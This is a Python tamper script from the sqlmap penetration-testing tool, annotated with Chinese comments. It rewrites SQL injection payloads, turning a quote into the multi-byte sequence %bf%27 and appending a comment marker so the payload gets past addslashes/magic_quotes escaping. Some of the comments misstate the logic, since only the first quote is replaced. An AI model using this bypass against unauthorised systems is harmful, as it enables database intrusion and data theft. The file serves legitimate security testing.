#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)

    Notes:
        * Useful for bypassing magic_quotes/addslashes feature

    Reference:
        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string

    >>> tamper("1' AND 1=1")
    '1%bf%27-- -'
    """

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                ##找到\或者'然后将%bf%27替代它
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                #循环知道替换掉所有的\和‘
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            #在新的retVal中匹配出AND 1=1
            if _ != retVal:
                retVal = _
                retVal += "-- -"
                #retVal变成AND 1=1 -- -
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                #只要retVal没有-- 或者# /
                retVal += "-- -"
    return retVal
